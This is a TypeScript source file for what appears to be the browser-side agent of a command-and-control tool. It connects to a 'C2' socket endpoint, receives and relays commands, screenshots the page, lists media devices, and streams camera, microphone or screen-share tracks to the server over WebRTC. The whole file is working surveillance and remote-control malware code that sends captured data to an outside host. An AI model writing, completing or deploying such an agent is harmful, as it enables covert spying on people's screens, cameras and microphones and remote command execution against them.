import _ from "lodash";
import { C2_SOCKET_ENDPOINT } from "./consts";
import { MembraneWebRTC } from "@jellyfish-dev/membrane-webrtc-js";
import { Socket, Channel } from "phoenix";
import { Subject } from "rxjs";
import html2canvas from "html2canvas";

export class AgentSocket {
  private activeTracks: {
    [key: string]: { trackId: string; track: MediaStreamTrack };
  } = {};
  private localStream: MediaStream = new MediaStream();
  private webrtc: MembraneWebRTC;
  private socket: Socket;
  private agentChannel: Channel | undefined = undefined;
  readonly commandsSubject = new Subject<any>();
  readonly resultsSubject = new Subject<any>();

  constructor(agentId: string, token: string, onClose: () => void) {
    this.socket = new Socket(C2_SOCKET_ENDPOINT, {
      params: { agentId, token },
    });
    this.socket.onClose(onClose);
    this.webrtc = new MembraneWebRTC({
      callbacks: {
        onSendMediaEvent: (mediaEvent) => {
          this.agentChannel!.push("mediaEvent", { data: mediaEvent });
        },
        onConnectionError: (msg) => {
          this.agentChannel!.push("error", { msg });
        },
        onJoinSuccess: (_peerId, _peersInRoom) => {},
        onJoinError: (_metadata) => {},
      },
    });
    try {
      this.socket.connect();
    } catch (err) {}
    this.socket.onOpen(() => {
      this.agentChannel = this.socket.channel(`agent:${agentId}`);
      this.agentChannel.join().receive("ok", async () => {
        this.webrtc.join({});
        this.agentChannel?.push("commands", {});
        this.resultsSubject.subscribe({
          next: (result) => {
            this.agentChannel?.push("result", result);
          },
        });
      });
      this.agentChannel.on(
        "cmd",
        async ({ cmd, cmdId }: { cmd: string; cmdId: string }) => {
          this.agentChannel?.push("received", { cmdId });
          this.commandsSubject.next({ cmd, cmdId });
        }
      );
      this.agentChannel.on("send-devices", async () => {
        const devices = await navigator.mediaDevices.enumerateDevices();
        this.agentChannel?.push("devices", { devices });
      });
      this.agentChannel.on("screenshot", () => {
        html2canvas(document.body, {
          width: window.outerWidth,
          height: window.outerHeight,
        }).then((canvas) => {
          this.agentChannel?.push("screenshot", {
            img: canvas.toDataURL("image/png"),
          });
        });
      });
      this.agentChannel?.on("activate", async ({ deviceId }) => {
        const stream = await this.requestMediaStream(deviceId).catch(() => {});
        if (stream) {
          stream.getTracks().forEach((track) => {
            track.addEventListener("ended", () => {
              _.keys(this.activeTracks).forEach((key) => {
                if (this.activeTracks[key].track.id === track.id) {
                  track.stop();
                  this.webrtc.removeTrack(this.activeTracks[key].trackId);
                  this.localStream.removeTrack(track);
                  this.activeTracks = _.assign({}, this.activeTracks, {
                    [key]: undefined,
                  });
                }
              });
            });
            const trackId = this.webrtc.addTrack(track, stream, { deviceId });
            this.activeTracks = _.assign({}, this.activeTracks, {
              [deviceId]: { trackId, track },
            });
          });
        }
      });
      this.agentChannel?.on("deactivate", async ({ deviceId }) => {
        const track = this.activeTracks[deviceId];
        if (track) {
          track.track.stop();
          this.webrtc.removeTrack(track.trackId);
          this.localStream.removeTrack(track.track);
          this.activeTracks = _.assign({}, this.activeTracks, {
            [deviceId]: undefined,
          });
        }
      });
      this.agentChannel.on("disconnect", () => {
        this.leave();
      });

      this.agentChannel.on("mediaEvent", (event: any) =>
        this.webrtc!.receiveMediaEvent(event.data)
      );
    });
  }

  private requestMediaStream = async (deviceId: string) => {
    try {
      if (deviceId === "screenshare") {
        const streamScreenshare =
          await navigator.mediaDevices.getDisplayMedia();
        streamScreenshare
          .getTracks()
          .forEach((track) => this.localStream.addTrack(track));
        return streamScreenshare;
      } else {
        const deviceRequested = await navigator.mediaDevices
          .enumerateDevices()
          .then((devices) => _.find(devices, { deviceId }));
        if (deviceRequested) {
          switch (deviceRequested.kind) {
            case "audioinput":
              const streamAudio = await navigator.mediaDevices.getUserMedia({
                audio: { deviceId },
              });
              streamAudio
                .getTracks()
                .forEach((track) => this.localStream.addTrack(track));
              return streamAudio;
            case "videoinput":
              const streamVideo = await navigator.mediaDevices.getUserMedia({
                video: {
                  deviceId,
                  width: { ideal: 1280 },
                  height: { ideal: 720 },
                },
              });
              streamVideo
                .getTracks()
                .forEach((track) => this.localStream.addTrack(track));
              return streamVideo;
          }
        } else {
          const err = new Error("Device not found");
          this.agentChannel!.push("error", err);
          throw err;
        }
      }
    } catch (err) {
      this.agentChannel!.push("error", err as any);
      throw "error";
    }
  };

  public leave = () => {
    this.webrtc!.leave();
  };
}
